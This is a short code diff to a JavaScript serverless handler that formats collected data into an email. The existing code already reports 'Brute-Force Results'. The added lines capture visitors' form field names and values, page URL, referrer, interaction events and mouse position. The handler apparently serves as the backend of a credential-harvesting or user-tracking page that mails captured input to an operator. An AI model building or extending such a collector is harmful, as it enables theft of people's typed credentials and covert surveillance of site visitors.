@@ -62,6 +62,21 @@ exports.handler = async (event, context) => {
             Brute-Force Results: ${
               JSON.stringify(data.bruteForceResults) || "N/A"
             }
+            
+            Additional Data:
+            Page Load Time: ${data.pageLoadTime || "N/A"}
+            Page Load Event: ${data.pageLoadEvent || "N/A"}
+            Referrer: ${data.referrer || "N/A"}
+            URL: ${data.url || "N/A"}
+            User Interacted: ${data.userInteracted || "N/A"}
+            Interaction Type: ${data.interactionType || "N/A"}
+            Field Name: ${data.fieldName || "N/A"}
+            Field Value: ${data.fieldValue || "N/A"}
+            Interaction Time: ${data.interactionTime || "N/A"}
+            Visibility State: ${data.visibilityState || "N/A"}
+            Mouse Position: ${
+              data.mouseX ? `X: ${data.mouseX}, Y: ${data.mouseY}` : "N/A"
+            }
         `;
 
     // Email options
